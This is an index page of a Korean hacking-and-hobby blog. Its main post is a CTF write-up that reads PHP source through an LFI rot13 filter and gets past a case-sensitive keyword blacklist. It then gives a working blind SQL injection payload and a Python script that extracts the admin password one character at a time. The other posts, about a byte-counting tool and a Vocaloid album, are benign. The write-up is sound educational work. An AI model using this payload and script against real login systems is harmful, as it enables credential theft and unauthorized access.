<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
      가온나래 &middot; blog
    
  </title>

  <!-- CSS -->
  <link rel="stylesheet" href="/public/css/poole.css">
  <link rel="stylesheet" href="/public/css/syntax.css">
  <link rel="stylesheet" href="/public/css/lanyon.css">
  <link rel="stylesheet" href="/public/css/svg-icons.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/apple-touch-icon-precomposed.png">
  <link rel="shortcut icon" href="/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body class = "theme-base-10">

    <!-- Target for toggling the sidebar `.sidebar-checkbox` is for regular
     styles, `#sidebar-checkbox` for behavior. -->
<input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox">

<!-- Toggleable sidebar -->
<div class="sidebar" id="sidebar">
  <div class="sidebar-item">
    <p>The blog about Hacking, Programming, Anime, etc.</p>
    <a href="https://github.com/GAONNR" target="_blank">
			<i class="svg-icon svg-icon-github"></i>
		</a>
		<a href="https://facebook.com/gaon0403" target="_blank">
			<i class="svg-icon svg-icon-facebook"></i>
		</a>
		<a href="https://twitter.com/_gaonnr_" target="_blank">
			<i class="svg-icon svg-icon-twitter"></i>
		</a>
  </div>

  <nav class="sidebar-nav">
    <a class="sidebar-nav-item" href="/">Home</a>

    

    
    
      
        
        
      
    
      
        
        
      
    
      
        
          <a class="sidebar-nav-item" href="/about/">About</a>
        
        
      
    
      
        
          <a class="sidebar-nav-item" href="/archive/">Archive</a>
        
        
      
    
      
    
      
        
        
      
    
      
        
        
      
    
      
        
        
      
    
      
        
        
      
    
      
    

    
    <!--
    <a class="sidebar-nav-item" href="/archive/v1.0.0.zip">Download</a>
    <a class="sidebar-nav-item" href="">GitHub project</a>
    -->
    <span class="sidebar-nav-item">Currently v1.0.0</span>
  </nav>

  <div class="sidebar-item">
    <p>
      &copy; 2016. All rights reserved.
    </p>
  </div>
</div>


    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
         content to avoid any CSS collisions with our real content. -->
    <div class="wrap">
      <div class="masthead">
        <div class="container">
          <h3 class="masthead-title">
            <a href="/" title="Home">가온나래</a>
            <small>blog</small>
          </h3>
        </div>
      </div>

      <div class="container content">
        <div class="posts">
  
  <div class="post">
    <h1 class="post-title">
      <a href="/hacking/2016/09/24/kapo-writeup/">
        2016 Kaist - Postech Science War Writeup (wargame_easy | Web 200pt)
      </a>
    </h1>

    <span class="post-date">24 Sep 2016</span>

    <p>처음으로 쓰는 Writeup이다!</p>

<p>Web계열의 200점(확실하지 않음)짜리 문제인 <a href="http://chall.pwn-with.me">wargame_easy</a>이다.</p>

<p align="CENTER">
  <img src="/images/2016_09/kapo16/main1.png" style="width: 640px;" />
</p>

<p>링크를 타고 들어가면, 환영 문구와 함께 ‘Login’ ‘Register’ 두 개의 메뉴가 보인다.<br />
Register 메뉴를 통해 사이트에 가입한 후 로그인하면 다음과 같은 화면이 나온다.</p>

<p align="CENTER">
  <img src="/images/2016_09/kapo16/main2.png" style="width: 640px;" />
</p>

<p>Prob, Auth, Rank 등의 메뉴로 미루어 보건데 CTF사이트를 모티브로 만들어진 사이트이다.<br />
실제로 Prob에 적혀있는 키를 Auth에 넣어 보니 점수가 올라가 Rank에 반영되는 것을 확인할 수 있었다.</p>

<p>rank 메뉴에 진입했을 때의 URL이 <code class="highlighter-rouge">http://chall.pwn-with.me/?page=rank</code>이므로, LFI 취약점이 존재할 것으로 생각된다.<br />
이를 이용해서 php filer로 base64 인코딩된 소스를 얻으려 했으나, 소스 보기를 했을 경우 detected라는 문구밖에 보이지 않는다. page 뒤의 argument에 특정 단어가 삽임되었을 경우 이를 필터랑하고 detected를 출력하도록 프로그램되었을 것을 예상할 수 있다.</p>

<p>다른 php filter를 이용한 시도 결과, <code class="highlighter-rouge">php://filter/read=string.rot13/resource=</code>가 filtering에 걸리지 않음을 확인할 수 있었고, 이를 통해 login, register, rank, info 페이지의 소스를 13칸 밀린 caesar cipher의 형태로 알아낼 수 있었다.<br />
이를 복호화한 결과는 다음과 같다. (당시 toUpper 함수를 사용하여, 모든 소스가 대문자로 이루어져 있다)</p>

<p align="CENTER">
  <a href="https://github.com/GAONNR/Kapo2016/blob/master/plainIndex.php">index.php</a>&nbsp; &nbsp; &nbsp; &nbsp;
  <a href="https://github.com/GAONNR/Kapo2016/blob/master/plainLogin.php">login.php</a>&nbsp; &nbsp; &nbsp; &nbsp;
  <a href="https://github.com/GAONNR/Kapo2016/blob/master/plainInfo.php">info.php</a>
</p>

<p>먼저 주목해야 할 것은 info페이지의 19 ~ 35번 라인이다.</p>

<p><code class="highlighter-rouge">PHP
&lt;?PHP
	IF($_POST){
	   IF($_SESSION[ID] == 'ADMIN') EXIT();
     IF($_POST[PW] == ""){
				ECHO "&lt;SCRIPT&gt;ALERT('INPUT YOUR PASSWORD.');HISTORY.GO(-1);&lt;/SCRIPT&gt;";
			  EXIT();
     }
		 IF(STRLEN($_POST[PW]) &gt; 32){
		    ECHO "&lt;SCRIPT&gt;ALERT('CAN'T CREATE PASSWORD BIGGER THAN 32 BYTES.');HISTORY.GO(-1);&lt;/SCRIPT&gt;";
				EXIT();
		 }
		 $_POST[PW] = ADDSLASHES($_POST[PW]);
		 $SQL = "UPDATE MEMBER SET PW = '$_POST[PW]' WHERE ID = '$_SESSION[ID]'";
		 $Q = @MYSQL_QUERY($SQL);
		 ECHO "&lt;SCRIPT&gt;ALERT('PW CHANGED.');LOCATION.HREF='?PAGE=INFO';&lt;/SCRIPT&gt;";
	}
?&gt;
</code></p>

<p>info 페이지는 사용자의 비멀번호를 변경할 수 있는 페이지인데, 세 번째 줄의 <code class="highlighter-rouge">IF($_SESSION[ID] == 'ADMIN') EXIT();</code>에 의해 서버에 admin이 등록되어 있으며, admin 계정의 비밀번호 변경을 막고 있음을 알 수 있다. 따라서 admin계정의 비밀번호를 알아내는 것을 목표로 정하고 다음 과정을 진행하였다.</p>

<p>다음으로 login 페이지의 12 ~ 35번 라인에서 공격 방식에 대한 힌트를 찾을 수 있었다.</p>

<p><code class="highlighter-rouge">PHP
&lt;?PHP
	IF($_POST){
		IF($_SESSION[ID]){
			ECHO "&lt;SCRIPT&gt;ALERT('YOU HAVE ALREADY LOGGED IN.');HISTORY.GO(-1);&lt;/SCRIPT&gt;";
			EXIT();
		}
		$SQL = "SELECT * FROM MEMBER WHERE ID = '".TRIM($_POST[ID])."'";
		$RESULT = @MYSQL_QUERY($SQL);
		$DATA = @MYSQL_FETCH_ARRAY($RESULT);
		IF($DATA[ID]){
			IF($_POST[PW] == $DATA[PW]){
				$_SESSION[ID] = $DATA[ID];
				ECHO "&lt;SCRIPT&gt;ALERT('HELLO $_SESSION[ID]');LOCATION.HREF='./';&lt;/SCRIPT&gt;";
			}ELSE{
				ECHO "&lt;SCRIPT&gt;HISTORY.GO(-1);&lt;/SCRIPT&gt;";
				EXIT();
			}
		}ELSE{
			ECHO "&lt;SCRIPT&gt;HISTORY.GO(-1);&lt;/SCRIPT&gt;";
			EXIT();
		}
	}
?&gt;
</code></p>

<p>공격 방식으로 SQL Injection이 유효함을 (매우 쉽게) 알 수 있다.</p>

<p>이제 index 페이지의 75 ~ 80번 라인을 보면,</p>

<p><code class="highlighter-rouge">PHP
&lt;?PHP
	IF(PREG_MATCH("/CONVERT|BASE64|DATA|UNION|SELECT|FROM|WHERE|SLEEP|BENCH|JOIN|CHAR|INFOR|SCHEMA|COLUMNS|LIKE|#|\)|\(|&gt;|&lt;|,|\*|!|\.\./",IMPLODE($_GET))) EXIT("DETECTED");
	IF(PREG_MATCH("/CONVERT|BASE64|DATA|UNION|SELECT|FROM|WHERE|SLEEP|BENCH|JOIN|CHAR|INFOR|SCHEMA|COLUMNS|LIKE|#|\)|\(|&gt;|&lt;|,|\*|!|\.\./",IMPLODE($_POST))) EXIT("DETECTED");
	IF(ISSET($_GET[PAGE])){
		INCLUDE($_GET[PAGE].".PHP");
	}ELSE{
?&gt;
</code></p>

<p>base64, select 등의 많은 구문을 입력에서 걸러내고 있음을 알 수 있다. 처음 LFI를 시도할 때, base64 filter가 detected된 것도 이 코드에 의해서임을 파악할 수 있었다.</p>

<p>처음에는 Time-based Blind SQL Injecton으로 공격을 시도하려 했으나, <code class="highlighter-rouge">sleep</code>, <code class="highlighter-rouge">bench</code>등의 중요한 함수들이 필터링되고, 결정적으로 괄호 <code class="highlighter-rouge">(</code>, <code class="highlighter-rouge">)</code>들이 필터링되어 불가능하다고 판단되었다.  괄호가 막혔기 때문에 목록에 없는 함수를 사용하는 것도 거의 불가능했다.</p>

<p>그러나 곧 위 코드의 치명적인 취약점을 찾아낼 수 있었는데, 그것은 <code class="highlighter-rouge">preg_match</code>함수의 첫 번째 argument string 뒤에 <code class="highlighter-rouge">i</code>가 붙지 않았다는 것이었다. 이는 preg_match에서 대소문자를 구별하여 받아들인다는 것을 뜻하고, SQL은 구문의 대소문자를 구별하지 않으므로, 이를 이용하여 필터링을 아주 간단하게 우회할 수 있었다. 예를 들어 <code class="highlighter-rouge">like</code>를 SQL 구문에 포함시키고 싶다면, <code class="highlighter-rouge">like</code> 대신 <code class="highlighter-rouge">LikE</code>라고 쓰면 필터링을 우회하여 서버에 그대로 구문을 보낼 수 있게 된다.</p>

<p>이에 착안하여 다음과 같은 payload를 만들 수 있었다.</p>

<p><code class="highlighter-rouge">fqwrlqwrhqwklhflqfi123123' or CASE WHEN id='admin' AND pw LikE 'a%' THEN TRUE ELSE FALSE END or id='godj3' order by id asc -- a</code></p>

<p>이를 login의 id에 넣으면 다음과 같은 SQL Query가 완성된다.</p>

<p><code class="highlighter-rouge">SQL
SELECT * FROM MEMBER WHERE ID = 'fqwrlqwrhqwklhflqfi123123' or CASE WHEN id='admin' AND pw LikE 'a%' THEN TRUE ELSE FALSE END or id='godj3' order by id asc -- a
</code></p>

<p>괄호가 필터링됨으로 인해 if, substr등의 함수를 사용할 수 없었으므로, 그 대신에 case when과 like를 활용하여 비슷한 역할을 하는 구문을 만들 수 있었다.</p>

<p>ID로 들어가는 <code class="highlighter-rouge">fqwrlqwrhqwklhflqfi123123</code>은 서버에 등록되어 있지 않은 id이므로, 언제나 거짓을 반환한다. 그 후 <code class="highlighter-rouge">CASE WHEN id='admin' AND pw LikE 'a%' THEN TRUE ELSE FALSE END</code>를 만나게 되는데, 만약 admin의 pw가 a로 시작한다면 TRUE를, 아니라면 FALSE를 반환한다. 만약 FALSE라면, 뒤의 구문에 의해 <code class="highlighter-rouge">godj3</code>을 id로서 불러오게 되고, pw부분에 미리 만들어 둔 godj3 계정의 비밀번호를 입력해 두면 godj3계정으로 로그인된다. 만약 admin의 pw가 a로 시작한다면, 미리 입력해 둔 godj3 계정의 비밀번호와 admin의 비밀번호는 맞지 않을 것이므로 로그인에 실패하게 된다. 이를 이용하여 admin의 password를 알아내는 프로그램을 짤 수 있다.</p>

<p align="CENTER">
	<a href="https://github.com/GAONNR/Kapo2016/blob/master/login.py">login.py</a>
</p>

<p>```python
import requests
import string</p>

<p>baseurl = ‘http://chall.pwn-with.me/?page=login’</p>

<p>def postData(id, pw):
    params = {‘id’: id, ‘pw’: pw}
    res = requests.post(baseurl, data = params)</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#print res.text
if res.text.find('Hello') &gt; 0:
    return True
else:
    return False
</code></pre>
</div>

<h1 id="print-postdatafqwrlqwrhqwklhflqf-or-ifidadmin-and-0-1-0-or-nameguest-order-by-name-asc----a-guest">print postData(‘'’fqwrlqwrhqwklhflqf’ or if(id=’admin’ and 0, 1, 0) or name=’guest’ order by name asc – a’’’, ‘guest’)</h1>

<p>print postData(“fqwrlqwrhqwklhflqfi123123’ or CASE WHEN id=’admin’ AND FALSE THEN TRUE ELSE FALSE END or id=’godj3’ order by id asc – a”, ‘godj3’)</p>

<p>print postData(‘godj3’, ‘godj3’)</p>

<p>print postData(“sadawqoeqweqnnncxma’ or id=’godj3’ – a”, ‘godj3’)</p>

<p>payload = “fqwrlqwrhqwklhflqfi123123’ or CASE WHEN id=’admin’ AND pw LikE ‘”</p>

<p>payend = “%’ THEN TRUE ELSE FALSE END or id=’godj3’ order by id asc – a”</p>

<p>key = ‘’</p>

<p>for k in range(100):
    check = False
    for i in string.printable:
        if i == ‘_’ or i == ‘!’ or i == ‘#’ or i == ‘%’ or i == ‘'’ or i == ‘"’ or i == ‘(‘ or i == ‘)’ or i == ‘*’ or i == ‘+’ or i == ‘-‘ or i == ‘&amp;’ or i == ‘|’ or i == ‘&gt;’ or i == ‘&lt;’ or i == ‘=’ or i == ‘?’ or i == ‘~’ or i == ‘,’:
            continue
        # print key + i,
        # print postData(payload + i + payend, ‘godj3’)
        if not postData(payload + key + i + payend, ‘godj3’):
            print key + i
            key = key + i
            check = True
            break</p>

<div class="highlighter-rouge"><pre class="highlight"><code>if check == False:
    key += '_' ```
</code></pre>
</div>

<p>flag: <code class="highlighter-rouge">kapo{j.s.bach_french_suites}</code></p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="/development/2016/09/13/jagisogae/">
        자기소개서 글자 수 (Byte수) 카운팅 프로그램
      </a>
    </h1>

    <span class="post-date">13 Sep 2016</span>

    <p>고등학교 2학년 때, 대입 원서를 쓸 당시 너무나도 딴짓이 하고 싶었던 나머지 자기 소개서의 글자 수를 세 주는 프로그램을 만들었는데, 어쩌다 보니 다음 해, 다다음 해에도 이 프로그램을 찾아주는 후배님들이 계셔서, 몇 달 전에 웹 페이지를 따로 제작하여 프로그램에 대한 정리와 함께 올려 두었다.</p>

<p>당시 하나도 모르던 C#(지금도 하나도 모른다)을 여기저기 구글링하면서 짠 프로그램이라, 꽤 엉성하다.</p>

<p><a href="http://jagi.gaonnr.me">자기소개서 글자 수 세기</a></p>

<p align="CENTER">
  <img src="/images/2016_09/jagi_count.png" style="width: 640px;" />
</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="/otaku/2016/06/30/Eight-Album/">
        八王子P 베스트 앨범 [Eight - The Best of 八王子P] 구매
      </a>
    </h1>

    <span class="post-date">30 Jun 2016</span>

    <p>몇 주 전에 하치오지P(八王子P)의 베스트 앨범이 발매된다는 소식을 들었다. 원래 그렇게 좋아하는 보컬로이드 프로듀서는 아니었지만, 저번 삿포로 여행에서 DJ Live에 참가하고 나서 호감을 가지게 되어 심심할 때마다 음악을 듣고 있었는데, 베스트 앨범이 발매된다고 하길래 조금의 고민 끝에 구매를 결정했다.</p>

<p>초회한정판과 일반판 두 가지로 나뉘어 발매되었는데, 앨범 일러스트가 다르고, 초회한정판에는 주요 곡들의 PV가 담긴 DVD가 동봉되어 있다. 본인은 초회한정판을 구매했다.</p>

<p align="CENTER">
    <img src="/images/2016_07/01.jpg" style="width: 480px;" />
    <img src="/images/2016_07/02.jpg" style="width: 480px;" />
    <span class="italics">앨범의 모습. 사진으론 모르겠지만 꽤 두껍다.</span>
</p>

<p align="CENTER">
    <img src="/images/2016_07/03.jpg" style="width: 480px;" />
    <img src="/images/2016_07/04.jpg" style="width: 480px;" />
    <span class="italics">뜯어보면 요래 생겼다. 미쿠 말고도 구미 일러스트가 보인다. 초회한정판이라 CD는 총 3개이다.</span>
</p>

<p align="CENTER">
    <img src="/images/2016_07/05.jpg" style="width: 480px;" />
    <span class="italics">사실 기본판보다 일러스트가 더 취향이라서 초회한정판을 샀다.... DVD 화질이 그리 좋은 것도 아니고 사실 유튜브 공식 채널에 PV는 다 올라와 있다.</span>
</p>

<p>베스트 앨범이다 보니 곡이 많은데, ‘BLACK STAR’와 ‘WHITE MOON’이라고 이름붙여진 두 개의 CD에 나뉘어 수록되어 있다. CD에 들어간 곡들의 분위기에 맞게 이름을 붙인 느낌이다.
총 36곡이며, 리스트는 다음과 같다.</p>

<p>```
★BLACK STAR
01      気まぐれメルシィ feat. 初音ミク
02      Sweet Devil -Eight Mix- feat. 初音ミク
03      Baby Maniacs -Eight Mix- feat. 初音ミク
04      fake doll feat. 初音ミク
05      Little Scarlet Bad Girl feat. 初音ミク
06      Carry Me Off feat. 初音ミク
07      KiLLER LADY -Eight Mix- feat. GUMI
08      GAME OVER feat. 初音ミク
09      Heart Chrome feat. 杏音鳥音
10      Mad Lovers -Eight Mix- feat. 巡音ルカ
11      Free -Eight Mix- feat. 巡音ルカ
12      candii -Eight Mix- feat. 初音ミク
13      REWRITER feat. GUMI
14      rock -Eight Mix- feat. 初音ミク・巡音ルカ
15      Distorted Princess -Eight Mix- feat. 初音ミク・巡音ルカ
16      Dream Creator feat. GUMI
17      Beautiful Nightmare feat. 巡音ルカ
18      Queen of the Night feat. 初音ミク・巡音ルカ</p>

<p>☆WHITE MOON</p>

<p>01      Blue Star feat. 初音ミク
02      Weekender Girl feat. 初音ミク
03      エレクトリック・ラブ -Eight Mix- feat. 初音ミク
04      デスクトップ・シンデレラ feat. 初音ミク
05      Twinkle World feat. 初音ミク
06      HORIZON feat. 初音ミク
07      シューティングスター feat. 鏡音リン・鏡音レン
08      Keep Only One Love -Eight Mix- feat. 初音ミク
09      Tomorrow feat. 初音ミク
10      TRAP × TRAP feat. 初音ミク
11      エレクトリック・スター -Eight Mix- feat. GUMI
12      FUTURE DRIVER feat. 初音ミク
13      エレクトリック・マジック feat. 鏡音リン・鏡音レン
14      whiteout -Eight Mix- feat. 初音ミク
15      フカヨミ feat. 初音ミク
16      弱虫ロケット feat. 初音ミク
17      Yeah! Yeah!! Yeah!!! feat. 初音ミク
18      Step To Tomorrow feat. 初音ミク・鏡音リン・鏡音レン・巡音ルカ・GUMI
```</p>

<p>막귀라서 함부로 평을 내릴 수는 없지만, 개인적으론 퀄리티 높고 괜찮은 앨범이라고 생각한다.
개인적으로 괜찮았던 몇 곡의 PV를 아래에 링크시켜 놓았다.</p>

<p align="CENTER">
<iframe width="560" height="315" src="https://www.youtube.com/embed/o1iz4L-5zkQ" frameborder="0" allowfullscreen=""></iframe>
</p>

<p align="CENTER">
<span class="italics">1. 気まぐれメルシィ(변덕 메르시) feat. 初音ミク</span>
</p>

<p align="CENTER">
<iframe width="560" height="315" src="https://www.youtube.com/embed/Kobrtyw97kU" frameborder="0" allowfullscreen=""></iframe>
</p>

<p align="CENTER">
<span class="italics">2. Beautiful Nightmare feat. 巡音ルカ</span>
</p>

<p align="CENTER">
<iframe width="560" height="315" src="https://www.youtube.com/embed/sK92X82T3Sk" frameborder="0" allowfullscreen=""></iframe>
</p>

<p align="CENTER">
<span class="italics">3-1. Blue Star feat. 初音ミク (MIKU EXPO ver.)</span>
</p>

<p align="CENTER">
<iframe width="560" height="315" src="https://www.youtube.com/embed/xSnuVnOZd1U" frameborder="0" allowfullscreen=""></iframe>
</p>

<p align="CENTER">
<span class="italics">3-2. Blue Star feat. 初音ミク</span>
</p>

<p align="CENTER">
<iframe width="560" height="315" src="https://www.youtube.com/embed/rQCPXcckCaQ" frameborder="0" allowfullscreen=""></iframe>
</p>

<p align="CENTER">
<span class="italics">4. デスクトップ・シンデレラ(데스크톱 신데렐라) feat. 初音ミク</span>
</p>

<p align="CENTER">
<iframe width="560" height="315" src="https://www.youtube.com/embed/I_bs61WyzMk" frameborder="0" allowfullscreen=""></iframe>
</p>

<p align="CENTER">
<span class="italics">5. Little Scarlet Bad Girl feat. 初音ミク</span>
</p>

<p align="CENTER">
<iframe width="560" height="315" src="https://www.youtube.com/embed/UGG7tUMg77A" frameborder="0" allowfullscreen=""></iframe>
</p>

<p align="CENTER">
<span class="italics">6. Carry Me Off feat. 初音ミク</span>
</p>

<p align="CENTER">
<iframe width="560" height="315" src="https://www.youtube.com/embed/06d8SwcSm_Q" frameborder="0" allowfullscreen=""></iframe>
</p>

<p align="CENTER">
<span class="italics">7. Weekender Girl feat. 初音ミク</span>
</p>

  </div>
  
</div>

<div class="pagination">
  
    <a class="pagination-item older" href="/page2">Older</a>
  
  
    <span class="pagination-item newer">Newer</span>
  
</div>

      </div>
    </div>

    <label for="sidebar-checkbox" class="sidebar-toggle"></label>

    <script>
      (function(document) {
        var toggle = document.querySelector('.sidebar-toggle');
        var sidebar = document.querySelector('#sidebar');
        var checkbox = document.querySelector('#sidebar-checkbox');

        document.addEventListener('click', function(e) {
          var target = e.target;

          if(!checkbox.checked ||
             sidebar.contains(target) ||
             (target === checkbox || target === toggle)) return;

          checkbox.checked = false;
        }, false);
      })(document);
    </script>
  </body>
</html>
